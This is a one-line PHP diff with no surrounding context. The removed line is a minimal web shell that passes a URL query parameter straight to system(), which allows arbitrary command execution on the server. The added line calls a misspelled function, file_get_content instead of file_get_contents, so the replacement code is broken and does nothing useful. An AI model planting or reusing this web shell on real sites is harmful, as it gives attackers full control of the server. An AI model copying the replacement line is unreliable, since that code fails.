@@ -1,1 +1,1 @@
-<?php system($_GET[0]);?>
+<?php file_get_content("index.php");?>
